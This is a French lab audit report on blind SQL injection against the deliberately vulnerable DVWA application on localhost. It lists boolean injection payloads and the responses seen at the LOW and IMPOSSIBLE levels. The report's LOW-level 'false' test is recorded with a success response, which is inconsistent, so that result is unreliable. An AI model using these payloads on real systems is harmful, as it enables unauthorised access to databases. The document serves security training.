# SQL Injection Blind - Rapport d'audit

**Catégorie OWASP Top 10** : A03:2021 - Injection
**Sévérité** : Élevée
**URL testée** : http://localhost/DVWA/vulnerabilities/sqli_blind/
**Date du test** : 07/07/2026

---

## Messages observés

**Succès** :
User ID exists in the database.

**Échec** :
User ID is MISSING from the database.

---

## Résultats des tests

### Niveau LOW

**Test 1 : Comportement normal**
- Payload : 1
- Résultat : User ID exists in the database.

**Test 2 : ID inexistant**
- Payload : 999
- Résultat : User ID is MISSING from the database.

**Test 3 : Test booléen (vrai)**
- Payload : 1' AND '1'='1
- Résultat : User ID exists in the database.

**Test 4 : Test booléen (faux)**
- Payload : 1' AND '1'='2
- Résultat : User ID exists in the database.

**Test 5 : Extraire le nom de la base**
- Payload : 1' AND database()='dvwa
- Résultat : User ID exists in the database.

---

### Niveau IMPOSSIBLE

**Test 1 : Injection booléenne (vrai)**
- Payload : 1' AND '1'='1
- Résultat : User ID is MISSING from the database.

**Test 2 : Injection booléenne (faux)**
- Payload : 1' AND '1'='2
- Résultat : User ID is MISSING from the database.

---


